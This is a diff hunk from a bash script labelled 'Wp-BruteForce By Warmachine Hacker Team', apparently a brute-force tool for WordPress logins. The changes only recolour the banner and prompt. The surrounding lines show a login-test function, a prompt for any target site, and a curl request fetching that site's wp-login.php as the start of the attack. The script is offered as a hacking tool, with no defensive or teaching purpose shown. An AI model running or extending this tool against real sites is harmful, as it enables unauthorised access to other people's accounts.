@@ -45,14 +45,14 @@ function _TestLogin() {
         fi
 }
 
-echo ' _       __               ______                     '
+echo ' \e[32m_       __               ______                     '
 echo '| |     / /___  _________/ / __ \________  __________'
 echo '| | /| / / __ \/ ___/ __  / /_/ / ___/ _ \/ ___/ ___/'
 echo '| |/ |/ / /_/ / /  / /_/ / ____/ /  /  __(__  |__  ) '
 echo '|__/|__/\____/_/   \__,_/_/   /_/   \___/____/____/'
-echo -ne "${BLUE}     Wp-BruteForce By Warmachine Hacker Team"
+echo '\e[31m     Wp-BruteForce By Warmachine Hacker Team'
 
-echo -ne "[+] Input site target : "
+echo -ne "\e[31m[+] Input site target : "
 read Target 
 
 curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
